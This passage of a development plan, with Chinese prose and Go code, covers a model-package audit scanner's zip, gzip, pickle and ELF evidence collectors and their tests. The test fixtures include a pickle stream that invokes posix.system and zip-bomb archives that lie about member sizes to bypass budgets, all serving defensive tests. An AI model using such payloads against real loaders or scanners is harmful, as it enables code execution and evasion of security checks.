// Two cases. Declared comfortably above the budget is caught by the check itself.
// Declared with the high bit set makes int64(UncompressedSize64) negative, so the
// "> budget" comparison is false and the check is bypassed - and then it is the
// inner per-member budget, not this one, that bounds the member. That second case
// is what makes the inner budgets load-bearing rather than redundant, so it is
// pinned here over an ELF member (the pickle-side inner budget is pinned by
// TestCollectArchiveEvidenceBoundsAPickleMemberAtTheByteBudget).
func TestCollectArchiveEvidenceBoundsAMemberByItsDeclaredSize(t *testing.T) {
	dir := t.TempDir()
	cfg := DefaultBinaryConfig()
	cfg.MaxArchiveMemberBytes = 64

	t.Run("above the budget", func(t *testing.T) {
		body := append([]byte("\x80\x04cposix\nsystem\n."), bytes.Repeat([]byte(" "), 400)...)
		path := writeTestBytes(t, dir, "bomb.pt", lyingMember(t, "big.pkl", body, zip.Store, 1<<20))

		set := newTestEvidence(path, KindArchive)
		if err := collectArchive(path, set, cfg); err != nil {
			t.Fatalf("collectArchive: %v", err)
		}
		if !set.Bound.Structural {
			t.Fatalf("Bound.Structural = false for a member declaring a size above the budget")
		}
		if want := "member byte budget 64 reached at big.pkl"; !strings.Contains(set.Bound.Reason, want) {
			t.Errorf("bound reason = %q, want it to name %q", set.Bound.Reason, want)
		}
	})

	t.Run("high bit set", func(t *testing.T) {
		body := elfFixtureBytes(t, elfSpec{imports: []string{"connect"}})
		path := writeTestBytes(t, dir, "bomb2.pt", lyingMember(t, "lib.so", body, zip.Store, 1<<63))

		set := newTestEvidence(path, KindArchive)
		if err := collectArchive(path, set, cfg); err != nil {
			t.Fatalf("collectArchive: %v", err)
		}
		if !set.Bound.Structural {
			t.Fatalf("Bound.Structural = false for a high-bit declared member; the inner budget did not bound it")
		}
		if !strings.Contains(set.Bound.Reason, "lib.so") {
			t.Errorf("bound reason = %q, want it to name the member", set.Bound.Reason)
		}
		if !strings.Contains(set.Bound.Reason, "truncated at the byte budget") {
			t.Errorf("bound reason = %q, want the ELF member byte-budget wording", set.Bound.Reason)
		}
	})
}

// gzipOfZeros writes a gzip stream whose decompressed content is n zero bytes,
// streaming the input so the fixture stays small even when n is hundreds of
// megabytes. Zero bytes are used because they are neither a pickle nor a string,
// so the only bound a scan of them can record is the byte budget's.
func gzipOfZeros(t *testing.T, dir, name string, n int) string {
	t.Helper()
	var buf bytes.Buffer
	zw, err := gzip.NewWriterLevel(&buf, gzip.BestSpeed)
	if err != nil {
		t.Fatal(err)
	}
	block := make([]byte, 1<<20)
	for written := 0; written < n; {
		chunk := len(block)
		if remaining := n - written; remaining < chunk {
			chunk = remaining
		}
		if _, err := zw.Write(block[:chunk]); err != nil {
			t.Fatal(err)
		}
		written += chunk
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	return writeTestBytes(t, dir, name, buf.Bytes())
}

// TestCollectCompressedEvidenceNormalizesAZeroConfig pins that collectCompressed
// resolves a zero BinaryConfig to the defaults, as collectELF does. It is the
// collector where the asymmetry is a defect and not just a wart: streamReaderEvidence
// reads a budget of zero as "unlimited", so an unresolved zero disables the
// decompression bound entirely - fail-open in the one direction this design
// refuses, in contrast to the fail-closed-but-wrong a zero produces elsewhere.
//
// The mirror is Task 5's TestCollectELFEvidenceNormalizesAZeroConfig. Its shape is
// forced by the asymmetry itself: the two configs differ only on a stream past the
// DEFAULT budget, so the fixture inflates to DefaultBinaryConfig().MaxArchiveMemberBytes+1
// zero bytes and the zero config must bound it exactly as the default does.
func TestCollectCompressedEvidenceNormalizesAZeroConfig(t *testing.T) {
	dir := t.TempDir()
	budget := DefaultBinaryConfig().MaxArchiveMemberBytes
	path := gzipOfZeros(t, dir, "huge.gz", int(budget)+1)

	zero := newTestEvidence(path, KindCompressed)
	if err := collectCompressed(path, zero, BinaryConfig{}); err != nil {
		t.Fatalf("collectCompressed with a zero config: %v", err)
	}
	if !zero.Bound.Structural {
		t.Fatalf("a zero config left a %d-byte decompressed stream unbounded; the zero value must mean the default budget, not no budget", budget+1)
	}
	if want := fmt.Sprintf("decompressed stream exceeds %d bytes", budget); !strings.Contains(zero.Bound.Reason, want) {
		t.Errorf("bound reason = %q, want it to name the default budget %d", zero.Bound.Reason, budget)
	}

	def := newTestEvidence(path, KindCompressed)
	if err := collectCompressed(path, def, DefaultBinaryConfig()); err != nil {
		t.Fatalf("collectCompressed with the default config: %v", err)
	}
	if zero.Bound != def.Bound {
		t.Errorf("zero config bound = %+v, default config bound = %+v; they must agree", zero.Bound, def.Bound)
	}
}

// TestCollectArchiveEvidenceNormalizesAZeroConfig pins that collectArchive resolves
// a zero BinaryConfig to the defaults. It is not the fail-open case - a zero
// MaxArchiveMembers reads as "no member allowed" and bounds the first member, which
// is fail-closed - but it is the same asymmetry, and without it a caller that set
// one field would silently bound every archive.
func TestCollectArchiveEvidenceNormalizesAZeroConfig(t *testing.T) {
	dir := t.TempDir()
	raw := zipFixture(t, map[string][]byte{"data.pkl": []byte("\x80\x04cposix\nsystem\n.")}, []string{"data.pkl"})
	path := writeTestBytes(t, dir, "model.pt", raw)

	zero := newTestEvidence(path, KindArchive)
	if err := collectArchive(path, zero, BinaryConfig{}); err != nil {
		t.Fatalf("collectArchive with a zero config: %v", err)
	}
	def := newTestEvidence(path, KindArchive)
	if err := collectArchive(path, def, DefaultBinaryConfig()); err != nil {
		t.Fatalf("collectArchive with the default config: %v", err)
	}
	if zero.Bound.Structural {
		t.Errorf("a zero config produced a structural bound %+v; the zero value must mean the defaults", zero.Bound)
	}
	if zero.Bound != def.Bound {
		t.Errorf("zero config bound = %+v, default config bound = %+v; they must agree", zero.Bound, def.Bound)
	}
	if len(zero.Lines) != len(def.Lines) {
		t.Errorf("zero config produced %d evidence lines, default config produced %d", len(zero.Lines), len(def.Lines))
	}
}
```

文件顶部 import 块补 `"archive/zip"`、`"compress/gzip"`、`"hash/crc32"`（`lyingMember` 要重算被改写头部的 CRC——`ChecksumIEEE`，因为 `CreateRaw` 不做这件事，写错的 CRC 会让 `zip.Reader` 在读到成员时直接报错，夹具就测不到它想测的那个预算）。`"fmt"` 已在 Step 2 引入。

> **`TestCollectCompressedEvidenceNormalizesAZeroConfig` 的两点记录，都不改代码。** 其一，夹具必须膨胀到 `DefaultBinaryConfig().MaxArchiveMemberBytes+1`（256 MiB + 1）个字节，这个形状是被归一化的不对称本身逼出来的：两个配置只在"流越过**默认**预算"时才有分歧，所以夹具必须越过默认预算，用小 `cfg` 测不到归一化。**代价是解压 CPU，不是 256 MiB 内存**——实测约 1.37 s、约 0.1 MiB 分配、磁盘上 325 KB 的 `.gz`；`gzipOfZeros` 分块流式写入就是为了这一点。其二，它的第二段（`def` 臂：再用 `DefaultBinaryConfig()` 跑一遍并断言两个 `Bound` 相等）是**冗余**的，第一段已经从默认预算算出期望值并断言过了。评审建议删掉这一段；这里记录在案、留给最终评审，代码维持已交付的样子。

- [ ] **Step 5: 跑测试确认失败**

```bash
go test ./internal/codeaudit/ -run 'TestCollectArchive|TestCollectCompressed' 2>&1 | head -10
```

预期：编译失败，`undefined: collectArchive`。

- [ ] **Step 6: 实现**

追加到 `binary_evidence.go`（import 块补 `"archive/zip"`、`"bufio"`、`"compress/gzip"`；`isPickleStream` 由 Task 1 提供，这里直接用）：

```go
// collectArchive reads a zip-based container: PyTorch .pt, wheels, .npz, jars.
//
// Members are the subject, not the archive's own bytes, because that is where a
// container hides code: a .pt checkpoint is a zip whose data.pkl is a pickle
// stream, and a package can ship a shared object the same way. Every member is
// sniffed, and the ones that sniff as ELF or pickle are read with the same
// extractors used for a standalone file - one level deep, because a container
// inside a container is a nesting depth this version does not follow.
//
// A member that sniffs as an archive is skipped, and the skip is silent: it stays
// visible as a member line but does not set Bound. That is deliberate and its cost
// is named in the plan's boundary section (a checkpoint shipped only inside a zip
// never reaches its data.pkl), so it is not a hole to be plugged here by
// recursing, which would need its own depth and budget model.
//
// The decompressed-byte budget is shared across the archive rather than applied
// per member: a zip bomb is many small members, not one large one, so a per-member
// limit is a limit that does not bind.
func collectArchive(path string, set *EvidenceSet, cfg BinaryConfig) error {
	// Resolve a zero config to the defaults, as the other collectors do. A zero
	// MaxArchiveMembers would read as "no member is allowed" and bound every
	// archive on its first member - wrong, and fail-closed, but wrong.
	cfg = normalizeBinaryConfig(cfg)
	f, err := os.Open(path)
	if err != nil {
		return fmt.Errorf("open %s: %w", path, err)
	}
	defer f.Close()
	info, err := f.Stat()
	if err != nil {
		return fmt.Errorf("stat %s: %w", path, err)
	}

	zr, err := zip.NewReader(f, info.Size())
	if err != nil {
		// A file with zip magic that will not open is a container this scan did
		// not look inside - a failed look, not a bounded one, so the error is
		// returned rather than marked structural. That distinction is load-bearing
		// downstream: CollectEvidence records it as set.Err, and the scanner counts
		// set.Err as Incomplete rather than passing the file off as examined. A
		// markStructural here would have said "read, with a gap" about a file that
		// was never read at all.
		return fmt.Errorf("open archive %s: %w", path, err)
	}

	var decompressed int64
	for i, member := range zr.File {
		if i >= cfg.MaxArchiveMembers {
			set.markStructural(fmt.Sprintf("member ceiling %d reached (%d member(s))", cfg.MaxArchiveMembers, len(zr.File)))
			break
		}
		set.addStructured(SourceMember, fmt.Sprintf("%s size=%d", member.Name, member.UncompressedSize64))

		if member.FileInfo().IsDir() {
			continue
		}
		// The head is read for every member, including the ones that turn out to
		// be data: sniffing is what decides whether a member is worth reading in
		// full, and a member that is never sniffed is a member whose kind is
		// unknown.
		head, err := readMemberHead(member, sniffBytes)
		if err != nil {
			set.markStructural(fmt.Sprintf("member %s unreadable: %v", member.Name, err))
			continue
		}
		kind := ClassifyBinary(head, member.Name)
		if kind != KindELF && kind != KindPickle {
			continue
		}
		if decompressed+int64(member.UncompressedSize64) > cfg.MaxArchiveMemberBytes {
			set.markStructural(fmt.Sprintf("member byte budget %d reached at %s", cfg.MaxArchiveMemberBytes, member.Name))
			break
		}
		decompressed += int64(member.UncompressedSize64)

		switch kind {
		case KindELF:
			if err := collectELFMember(set, member, cfg); err != nil {
				// A member that cannot be read is a gap, recorded rather than
				// fatal: the members already read are still evidence.
				set.markStructural(fmt.Sprintf("member %s: %v", member.Name, err))
			}
		case KindPickle:
			if err := collectPickleMember(set, member, cfg); err != nil {
				set.markStructural(fmt.Sprintf("member %s: %v", member.Name, err))
			}
		}
	}
	return nil
}

// readMemberHead reads up to n bytes of a member without decompressing more than
// that. A member that declares more bytes than it delivers is fine here: sniffing
// needs the head only.
func readMemberHead(member *zip.File, n int) ([]byte, error) {
	rc, err := member.Open()
	if err != nil {
		return nil, err
	}
	defer rc.Close()

	buf := make([]byte, n)
	read, err := io.ReadFull(rc, buf)
	if err != nil && err != io.EOF && err != io.ErrUnexpectedEOF {
		return nil, err
	}
	return buf[:read], nil
}

// collectELFMember runs the byte extractors and the ELF extractor over a
// container member.
//
// debug/elf needs random access and a member is a stream, so the member is
// materialised first, bounded by the archive's byte budget. That is the cost of
// reading a nested ELF at all, and it is why the budget above is checked before
// this is called rather than inside it.
func collectELFMember(set *EvidenceSet, member *zip.File, cfg BinaryConfig) error {
	rc, err := member.Open()
	if err != nil {
		return err
	}
	defer rc.Close()

	data, err := io.ReadAll(io.LimitReader(rc, cfg.MaxArchiveMemberBytes))
	if err != nil {
		return err
	}
	if int64(len(data)) >= cfg.MaxArchiveMemberBytes {
		set.markStructural(fmt.Sprintf("member %s truncated at the byte budget", member.Name))
	}

	// The strings pass runs over the member as well as the structural parse
	// below. Without this, an ELF nested in a .whl would be the one executable
	// format in the channel read without a strings pass - its sibling member
	// kinds already get one - and a nested ELF is precisely where a stapled
	// payload would be put. The bytes are already in memory, so the pass is a scan
	// over a slice rather than a second read.
	//
	// pickleScan is false, and it must stay false: this member was classified as
	// an ELF, and the interpreter commits to a parse, so running it here would set
	// Bound.Structural on an executable kind and block the import of every wheel
	// that ships a shared object.
	//
	// A zero budget means unlimited here: the read that filled data was the
	// bounded one, and bounding the scan of an already-bounded slice would only
	// lose the tail of it.
	if err := streamReaderEvidence(bytes.NewReader(data), set, cfg, 0, "", false); err != nil {
		return err
	}

	// The member is parsed out of memory, so it gets a reader rather than a
	// path. A temporary file would be the alternative, and it would put
	// attacker-controlled bytes on the filesystem of the auditing process for no
	// reason.
	return collectELFReader(bytes.NewReader(data), set, cfg, member.Name)
}

// streamReaderEvidence runs the byte extractors over a stream, stopping after
// budget bytes and recording the cut as a structural bound. A budget of zero or
// less means the stream is read to the end. The strings pass always runs; the
// pickle interpreter runs only when pickleScan is true.
//
// It exists because three call sites need exactly this loop - a pickle member, an
// ELF member, and a decompressed gzip stream - and the bound has to be enforced
// identically in all of them. A whole file does not use this loop: it goes through
// streamEvidence, which is a separate implementation over the same rule, and
// unifying the two is deliberately left out of this change rather than taken on.
// The reason is not brevity. The bound is
// what sets Bound.Structural, Bound.Structural is what withholds a clean verdict
// from a stream whose tail was never read, and a call site that enforced it
// slightly differently would be a hole in the fail-closed rule rather than a
// style difference.
//
// pickleScan is a parameter rather than a read of set.Kind because a member's
// kind is the member's, not the set's: the set is the archive, and every member
// of an archive would otherwise be judged by the archive's kind. The caller
// already classified the member to decide to read it, so it is the caller that
// knows whether this stream is a claimed pickle. The gate exists because the
// interpreter commits to a parse: a byte it cannot classify as an opcode ends the
// parse with a structural bound, and a structural bound on an executable kind
// blocks the import - so an interpreter run over anything but a claimed pickle is
// a bound on a file that is not malformed at all.
//
// The budget is applied inside the read rather than between reads, for the same
// reason it is in streamEvidence: checking it at the top of the loop lets one 64
// KiB read walk past a much smaller budget. When the budget is spent, one probe
// byte decides whether it actually cut anything - a stream that ends exactly at
// the budget was read completely, and marking it bounded would fail a clean scan
// for no reason.
//
// bounded is the caller's wording for the cut, because the four sites name
// different budgets in their reasons.
func streamReaderEvidence(rc io.Reader, set *EvidenceSet, cfg BinaryConfig, budget int64, bounded string, pickleScan bool) error {
	scanner := newStringScanner(set, cfg)
	var pickles *pickleScanner
	if pickleScan {
		pickles = newPickleScanner(set)
	}

	var read int64
	buf := make([]byte, evidenceReadChunk)
	for {
		limit := len(buf)
		if budget > 0 && int64(limit) > budget-read {
			limit = int(budget - read)
		}
		if limit <= 0 {
			var probe [1]byte
			if n, err := rc.Read(probe[:]); n > 0 || (err != nil && err != io.EOF) {
				set.markStructural(bounded)
			}
			break
		}
		n, readErr := rc.Read(buf[:limit])
		if n > 0 {
			if _, err := scanner.Write(buf[:n]); err != nil {
				return err
			}
			if pickles != nil {
				if _, err := pickles.Write(buf[:n]); err != nil {
					return err
				}
			}
			read += int64(n)
		}
		if readErr == io.EOF {
			break
		}
		if readErr != nil {
			return readErr
		}
	}
	scanner.Flush()
	if pickles != nil {
		pickles.Flush()
	}
	return nil
}

// collectPickleMember runs the byte extractors over a pickle container member.
//
// pickleScan is true because the dispatcher classified this member as KindPickle
// before calling, and a claimed pickle is exactly the stream the interpreter is
// allowed to commit to.
func collectPickleMember(set *EvidenceSet, member *zip.File, cfg BinaryConfig) error {
	rc, err := member.Open()
	if err != nil {
		return err
	}
	defer rc.Close()

	return streamReaderEvidence(rc, set, cfg, cfg.MaxArchiveMemberBytes,
		fmt.Sprintf("member %s exceeds the byte budget", member.Name), true)
}

// collectCompressed reads a single-stream compressed file. Only the formats the
// standard library decompresses are opened; anything else is counted as a
// bounded data read by the dispatcher and named in a notice, because a
// decompressor written for this purpose would be a new parser on the import
// path with no evidence behind it.
func collectCompressed(path string, set *EvidenceSet, cfg BinaryConfig) error {
	// Resolve a zero config to the defaults, and this is the collector where it
	// matters most: streamReaderEvidence reads a budget of zero as "unlimited", so
	// an unresolved zero here would silently disable the decompression bound - the
	// one guard between a small .gz and an unbounded scan. That is fail-open in the
	// single direction this design refuses, rather than the merely-wrong fail-closed
	// a zero config produces elsewhere.
	cfg = normalizeBinaryConfig(cfg)
	f, err := os.Open(path)
	if err != nil {
		return fmt.Errorf("open %s: %w", path, err)
	}
	defer f.Close()

	set.addStructured(SourceNotice, "gzip stream decompressed for evidence")

	zr, err := gzip.NewReader(f)
	if err != nil {
		return fmt.Errorf("open gzip %s: %w", path, err)
	}
	defer zr.Close()

	// The decompressed bytes are a second file with their own kind, and they are
	// the one place the pickle gate has to be decided by sniffing rather than by a
	// classification the caller already made. It matters that it is decided at
	// all: a gzip of a tar is the common case (models/audit/holdout-sources/sr.tgz
	// is one), its bytes are not an opcode stream, and running the interpreter over
	// them would set a structural bound on KindCompressed - which is executable -
	// and block the import of every .gz that is not itself a pickle.
	//
	// A buffered reader peeks the head and then hands the same bytes on, so the
	// sniff reads nothing twice and costs no second pass. The path argument to
	// isPickleStream is empty on purpose: the extension belongs to the compressed
	// file, not to what it expands to.
	br := bufio.NewReaderSize(zr, sniffBytes)
	head, _ := br.Peek(sniffBytes)
	pickleScan := isPickleStream(head, "")

	// The decompressed length is attacker-controlled, so the budget is what keeps
	// a small .gz from expanding into an unbounded scan - the same guard the
	// archive path uses, and enforced through the same helper so the two cannot
	// drift.
	if err := streamReaderEvidence(br, set, cfg, cfg.MaxArchiveMemberBytes,
		fmt.Sprintf("decompressed stream exceeds %d bytes", cfg.MaxArchiveMemberBytes), pickleScan); err != nil {
		return fmt.Errorf("read gzip %s: %w", path, err)
	}
	return nil
}
```

- [ ] **Step 7: 跑测试确认通过**

```bash
go test ./internal/codeaudit/ -run 'TestCollect|TestELF|TestPickle|TestString|TestStream|TestShannon|TestEntropy|TestClassify' -v
```

预期全 PASS。

本步多了一条以前没有的判据：Task 5 的 ELF 用例现在**经过** `streamWithSizeSwitch` 才进入结构解析（Step 3 把 `collectELF` 改成了先 `streamWithSizeSwitch` 再 `collectELFReader`）。它们用的是 `DefaultBinaryConfig()`，`MaxFullScanBytes` 是 64 MiB，而夹具都是几百字节，所以开关判定的都是"整份读"，这些用例必须**原样全绿**——它们变红就说明 Step 3 的接线把默认路径改坏了。这条不变绿是 Step 3 唯一的集成证据：把整份读取换成开窗的回归不会只在这一个用例里露头，而会在 Task 5 的一整族用例上同时露头。

- [ ] **Step 8: 提交**

```bash
gofmt -l internal/codeaudit/ ; go vet ./internal/codeaudit/
git add internal/codeaudit/binary_evidence.go internal/codeaudit/binary_evidence_test.go
git commit -m "feat(audit): read zip and gzip containers, recursing into member evidence"
```

> **第三点，也是这三条里唯一一条会把结论翻面的：一个文件抽取失败时，它是被记成 `Incomplete`，不是被静默跳过。** 这条链要写全，因为它是本通道 fail-closed 的承重结构，而它同时跨了三个任务，单看任何一个任务的代码都看不出全貌：抽取函数（本步的 `collectArchive`、Task 5 的 `collectELF`、`collectCompressed` 等）在打不开容器/解析不了 ELF 时**返回 error**，而不是 `markStructural` 后继续——返回是刻意的，`markStructural` 记的是"这个文件读了但没读全"，而这里的事实是"这个文件根本没读成"，两者在报告里必须能分开；Task 7 的 `CollectEvidence` 把它收进 `set.Err` 而不是往外抛（往外抛会被 `import_processing.go:642-660` 当成整趟失败直接删包，报告连原因都来不及写）；Task 9 的 `ScanDirectory` 在 `if set.Err != nil` 分支里 `res.Summary.Incomplete++; return nil`——自增之后 `return nil`，所以这一个文件不会中断其余文件的扫描，但它**已经**被计数了。`Incomplete` 随后折进 `Report.Binary`，`ProvesCleanScan` 在 `b.Incomplete > 0` 时返回 false（`{"an unexamined file withholds", BinaryScanSummary{FilesCount: 3, Incomplete: 1}, false}`），于是导入被扣下。
>
> 所以判据是：**"抽取出错"与"被跳过"在报告里绝不能长得一样**。跳过是 `classify` 判定为非二进制（非常规文件、文本文件、非 ELF/pickle 的成员），它不计数，因为那不是一次失败的查看；抽取出错是一次失败的查看，它必须计数。宿主上有一个现成的形状能测这条链：`teellm/` 与 `deploy/guest-build/semgrep-payload/rootfs` 下有 **21 个被截断的 CUDA/MLX 库**——磁盘上约 10 MiB，而 ELF 头把节头表指向约 116 MB 偏移，于是 `elf.NewFile` 直接返回 `EOF`。它们今天不在任何模型包里，但只要有一个出现在包里，被截断的库就是"抽取出错"而不是"跳过"，`Incomplete` 必须是 1，包必须被扣下——这正是 `TestBinaryScannerCountsAnUnreadableFileAsIncomplete` 那一族要钉住的形状，也是它不能只测 `classify` 失败那条分支的原因。

---

### Task 7: 抽取调度与完整性记账

**Files:**
- Modify: `internal/codeaudit/binary_evidence.go`
- Test: `internal/codeaudit/binary_evidence_test.go`

- [ ] **Step 1: 写失败测试**

追加到 `binary_evidence_test.go`：

```go
func TestCollectEvidenceRoutesByKind(t *testing.T) {
	dir := t.TempDir()
	cases := []struct {
		name string
		file string
		raw  []byte
		want BinaryKind
		// wantSource is the evidence source only the dedicated collector for
		// this kind produces. It is asserted rather than implied by a non-empty
		// listing because the shared strings pass emits "connect" from an ELF
		// and "system" from a pickle just as readily as the collectors do, so
		// presence alone stays green when a kind is misrouted into that pass -
		// which is the loss this channel exists to prevent.
		wantSource EvidenceSource
	}{
		{"elf", "lib.so", elfFixtureBytes(t, elfSpec{imports: []string{"connect"}}), KindELF, SourceDynsym},
		{"archive", "m.pt", zipFixture(t, map[string][]byte{"a": []byte("x")}, []string{"a"}), KindArchive, SourceMember},
		{"pickle", "m.pkl", []byte("\x80\x04cposix\nsystem\n."), KindPickle, SourcePickle},
		{"raw", "w.bin", []byte("data\x00literal_here"), KindRaw, SourceStrings},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			path := writeTestBytes(t, dir, tc.file, tc.raw)
			set := CollectEvidence(path, tc.want, DefaultBinaryConfig())
			if set.Err != nil {
				t.Fatalf("CollectEvidence: %v", set.Err)
			}
			if len(set.Lines) == 0 {
				t.Error("no evidence at all from a file that has some")
			}
			// The source is what pins the dispatch: SourceDynsym comes only
			// from the ELF parse, SourceMember only from the zip walk and
			// SourcePickle only from the interpreter, so a kind that never
			// reached its collector cannot produce its line. KindRaw is the one
			// case where the shared strings pass is the collector, so its
			// expectation is SourceStrings and there is nothing stronger to
			// assert.
			found := false
			for _, l := range set.Lines {
				if l.Source == tc.wantSource {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("no %s evidence: the file never reached its %s collector", tc.wantSource, tc.want)
			}
			// Finalize assigns Index; nothing may read the listing before it.
			for i, l := range set.Lines {
				if l.Index != i+1 {
					t.Fatalf("line %d has Index %d; Finalize did not run or did not sort", i, l.Index)
				}
			}
			for i := 1; i < len(set.Lines); i++ {
				a, b := set.Lines[i-1], set.Lines[i]
				if a.Offset > b.Offset {
					t.Fatalf("listing is not in offset order at %d: %d then %d", i, a.Offset, b.Offset)
				}
			}
		})
	}
}

// TestCollectEvidenceDoesNotInterpretNonPicklesAsPickles pins the reversal of
// what this test used to assert. The plan previously ran the pickle scan on every
// stream unconditionally, which was harmless only because that scan was a
// byte-pattern match that never committed to a parse. The interpreter commits: it
// either reads the bytes as opcodes or records that it could not, and an ELF's
// first byte (\x7f) is not an opcode - so running it over a shared object would set
// Bound.Structural, and because KindELF is an executable kind that bound withholds
// a clean verdict and blocks the import. Every .so in every model package would be
// blocked. The interpreter therefore runs only on a stream that is claimed to be a
// pickle (Task 4's gate rule), and a non-pickle gets the strings pass alone.
func TestCollectEvidenceDoesNotInterpretNonPicklesAsPickles(t *testing.T) {
	dir := t.TempDir()
	path := writeTestBytes(t, dir, "libkernel.so",
		elfFixtureBytes(t, elfSpec{imports: []string{"connect"}}))

	set := CollectEvidence(path, KindELF, DefaultBinaryConfig())
	if set.Err != nil {
		t.Fatalf("CollectEvidence: %v", set.Err)
	}
	if set.Bound.Structural {
		t.Fatalf("an ELF tripped a structural bound (%s); the interpreter ran on a non-pickle", set.Bound.Reason)
	}
	for _, l := range set.Lines {
		if l.Source == SourcePickle {
			t.Errorf("pickle evidence %q produced from an ELF", l.Text)
		}
	}
}

// TestCollectEvidenceRecordsAnUnreadableFile pins the failure direction. A file
// that cannot be examined is an error on the set, not an empty listing: an empty
// listing reads as "clean" to everything downstream, which is the one thing an
// incomplete look must never say.
func TestCollectEvidenceRecordsAnUnreadableFile(t *testing.T) {
	dir := t.TempDir()
	path := writeTestBytes(t, dir, "broken.so", []byte("\x7fELF\x02\x01\x01\x00not an elf at all"))

	set := CollectEvidence(path, KindELF, DefaultBinaryConfig())
	if set.Err == nil {
		t.Error("Err = nil for a file with ELF magic that does not parse; the scan would report it clean")
	}
}

// TestCollectEvidenceWindowsAFileAboveTheSizeThreshold pins the size switch and,
// more importantly, that it leaves a trace.
//
// The threshold cannot be tested by making a 64 MiB file, so the config is
// lowered and the file kept small. Both directions are asserted for the reason
// the switch exists: a windowed data file is visible but harmless, and a windowed
// pickle - a format that executes - has to record a structural bound, or padding
// a pickle past the threshold would hide a mid-stream GLOBAL and still pass.
func TestCollectEvidenceWindowsAFileAboveTheSizeThreshold(t *testing.T) {
	dir := t.TempDir()
	cfg := DefaultBinaryConfig()
	cfg.MaxFullScanBytes = 16
	cfg.HeadTailBytes = 4

	// The marker sits in the middle, past the first window and before the last.
	content := []byte("HEAD\x00")
	content = append(content, bytes.Repeat([]byte{'x'}, 64)...)
	content = append(content, []byte("\x00MIDDLE_MARKER\x00TAIL")...)

	cases := []struct {
		name        string
		file        string
		kind        BinaryKind
		wantBlocked bool // isExecutableKind: a structural bound on this kind withholds a clean verdict
	}{
		{"a windowed data file is recorded but harmless", "w.bin", KindRaw, false},
		{"a windowed pickle withholds", "m.pkl", KindPickle, true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			path := writeTestBytes(t, dir, tc.file, content)
			set := CollectEvidence(path, tc.kind, cfg)
			if set.Err != nil {
				t.Fatalf("CollectEvidence: %v", set.Err)
			}
			if !set.Bound.Structural {
				t.Error("Bound.Structural = false: the middle of an oversized file was skipped without a trace")
			}
			if !strings.Contains(set.Bound.Reason, "MaxFullScanBytes") {
				t.Errorf("Bound.Reason = %q, want it to name the threshold", set.Bound.Reason)
			}
			for _, l := range set.Lines {
				if l.Text == "MIDDLE_MARKER" {
					t.Error("the middle was read anyway; the threshold is not a threshold")
				}
			}
			// This last check is on the predicate itself, not on CollectEvidence:
			// CollectEvidence never consults isExecutableKind, so this only
			// keeps wantBlocked above honest against the table. What folds the
			// predicate into a withheld verdict is the scanner's, and that
			// arrives in Task 9.
			if got := isExecutableKind(tc.kind); got != tc.wantBlocked {
				t.Errorf("isExecutableKind(%s) = %t, want %t", tc.kind, got, tc.wantBlocked)
			}
		})
	}
}
```

**关于 `pickle` 那一格的诚实说明**：加上 `wantSource` 之后，`elf`/`archive` 两格的派发是被**完全**钉住的——`SourceDynsym` 只可能来自 ELF 解析、`SourceMember` 只可能来自 zip 遍历，走岔了的 kind 产不出这一行。但 `pickle` 那一格只能钉到「解释器跑了」这一层：`CollectEvidence` 的 pickle 分支**就是**共享的 `streamWithSizeSwitch` 这一趟（见 Step 3 的 `case KindNumpy, KindPickle, KindRaw`），并不存在一个「专属的 pickle 抽取器」可供绕开，所以这一格证明的是 kind 被正确传进了那趟共享扫描、解释器随之开跑，而不是「路由到了一个别的实现」。`pickle`/`raw` 这一路上尺寸开关的残余风险由 `TestCollectEvidenceWindowsAFileAboveTheSizeThreshold` 接住——那条用例才是在钉超阈值后中间段被跳过这件事。这是派发结构本身的性质，不是这条测试的短板；写在这里，免得后来者对着这一格反复琢磨。

- [ ] **Step 2: 跑测试确认失败**

```bash
go test ./internal/codeaudit/ -run TestCollectEvidence 2>&1 | head -10
```

预期：编译失败，`undefined: CollectEvidence`。

- **Step 3: 实现**

本块只加 `CollectEvidence` 一个函数。它调用的 `streamWithSizeSwitch` 与 `streamHeadAndTail` **在 Task 6 定义**（Task 6 的 `collectELF` 薄封装要调 `streamWithSizeSwitch`，而 Go 没有前向声明，定义留在本任务会让 Task 6 停在 `undefined: streamWithSizeSwitch`）——这两个函数不要在这里重新加一遍。

追加到 `binary_evidence.go`：

```go
// CollectEvidence gathers the evidence for one file and returns it finalized.
//
// It is the only entry point: the kind is decided by the caller so that the
// classification happens once, against the same head bytes the caller already
// read to decide the file was binary at all. A second sniff here would be a
// second answer to one question.
//
// An error is recorded on the set rather than returned, because the caller's
// decision is not "abort" but "count this file as not examined" - and a file
// that was not examined has to reach the report, not stop it. Concretely: the
// scanner reads set.Err and increments BinaryScanSummary.Incomplete, which
// ProvesCleanScan refuses on. So a file whose extraction failed is counted
// Incomplete and withholds the pass; it is never silently skipped. The two must
// not be interchangeable - "skipped" means classify said the file is not binary,
// which is not a look that failed, while set.Err means the file is binary and
// this scan could not read it.
func CollectEvidence(path string, kind BinaryKind, cfg BinaryConfig) *EvidenceSet {
	cfg = normalizeBinaryConfig(cfg)
	set := newEvidenceSet(path, kind, cfg)

	if info, err := os.Stat(path); err == nil {
		set.Size = info.Size()
	}

	var err error
	switch kind {
	case KindELF:
		err = collectELF(path, set, cfg)
	case KindArchive:
		// The head and tail pass runs over the archive's own bytes as well as
		// its members. A payload appended after the last member is outside
		// everything the zip directory describes, and reading only the members
		// would leave exactly that region unexamined.
		//
		// No size switch here: this path is already the head and tail pass, and
		// the members behind it are bounded by MaxArchiveMemberBytes rather than
		// by the file's own size. A 200 MiB .zip and a 92 MiB .pth both take this
		// route today.
		err = streamHeadAndTail(path, set, cfg)
		if err == nil {
			err = collectArchive(path, set, cfg)
		}
	case KindCompressed:
		// Also no size switch: the stream was decompressed on purpose, and
		// skipping its middle would defeat the only reason to have opened it.
		// MaxArchiveMemberBytes is the bound that applies.
		err = collectCompressed(path, set, cfg)
	case KindNumpy, KindPickle, KindRaw:
		// No entropy verdict for these, deliberately. A raw blob is most of what
		// a model package is, and weights are near-random by nature: a whole-file
		// entropy rule would fire on every .safetensors ever exported and teach
		// the operator to ignore the family. It is also unnecessary here, because
		// nothing on this platform executes a raw blob - a payload that runs
		// arrives as an ELF or a pickle, and both carry precise evidence.
		err = streamWithSizeSwitch(path, set, cfg)
	default:
		return evidenceError(path, kind, fmt.Errorf("unsupported binary kind %q", kind))
	}

	if err != nil {
		set.Err = err
	}
